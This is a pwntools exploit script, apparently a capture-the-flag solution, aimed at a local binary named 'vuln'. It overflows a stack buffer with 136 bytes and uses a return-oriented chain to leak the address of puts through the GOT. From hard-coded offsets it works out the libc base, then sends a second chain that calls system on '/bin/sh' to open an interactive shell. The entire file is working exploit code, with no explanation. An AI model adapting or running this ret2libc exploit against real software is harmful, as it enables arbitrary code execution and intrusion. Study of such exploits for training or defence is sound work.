from pwn import *

binary  = context.binary = ELF('./vuln')
r = process(binary.path)
#gdb.attach(r, api=True)

ret = 0x000000000040052e
pop_rdi_ret = 0x0000000000400913
do_stuff = 0x4006d8
plt_puts = 0x400540
got_puts = 0x601018

junk = b"a" * 136
payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) 
payload += p64(ret) + p64(do_stuff)

r.sendline(payload)

leak = r.recvline()
leak = r.recvline()

leak = u64(r.recvline().strip().ljust(8,b"\x00"))
log.info('puts: ' + hex(leak))

offset_puts = 0x0000000000080a30
libc_base = leak - offset_puts
print('libc base = ' + hex(libc_base))

system_offset = 0x000000000004f4e0
binsh_offset = 0x1b40fa

system_address = libc_base + system_offset
binsh_address = libc_base + binsh_offset

payload = junk + p64(ret) + p64(pop_rdi_ret) + p64(binsh_address) +p64(system_address)
r.sendline(payload)

r.interactive()
